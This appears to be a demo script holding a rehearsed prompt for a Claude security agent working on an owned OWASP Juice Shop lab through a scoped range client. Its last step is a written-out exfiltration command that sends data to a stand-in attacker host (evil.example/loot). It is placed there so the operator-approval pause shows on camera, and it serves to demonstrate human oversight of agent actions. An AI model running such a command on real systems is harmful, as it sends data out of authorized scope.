# Agent task (paste into the `recon` agent pane)

This is the rehearsed prompt for the live Claude agent in the demo. It keeps the recording
predictable while the agent works for real. Copy the block below into the `recon` pane after
`arm` (in the run-of-show), then narrate while it works.

> The prompt deliberately routes every action through `rbt-range` (the scoped range client) and
> ends with a step that is **tiered**, so the approval pause happens on camera.

---

You are a security research agent on an authorized internal lab engagement. You are working
against an OWASP Juice Shop target that we own and built. Your only way to act in the range is the
`rbt-range` command: run `rbt-range -- <command>` to execute a shell command inside the attacker
box. Do not use any other network or shell tool to reach the target. The Juice Shop target is
reachable from the attacker at `http://127.0.0.1:3000`.

Do exactly these steps, briefly narrating each:

1. Confirm access: `rbt-range -- id`
2. Recon the target's ground truth — how many challenges exist:
   `rbt-range -- "curl -s http://127.0.0.1:3000/api/Challenges/ | head -c 400"`
3. Write a short finding to the evidence folder:
   `rbt-range -- "mkdir -p ~/evidence && printf '# Finding\n\nJuice Shop reachable over the scoped link; challenge API exposed.\n' > ~/evidence/finding.md && echo saved"`
4. Attempt to exfiltrate the finding to an external collector (this is expected to pause for
   operator approval — that is the point; wait for it to be approved, then report the result):
   `rbt-range -- "curl -s http://evil.example/loot -d @/dev/stdin <<< recon-complete"`

Stop after step 4 and summarize what you did.
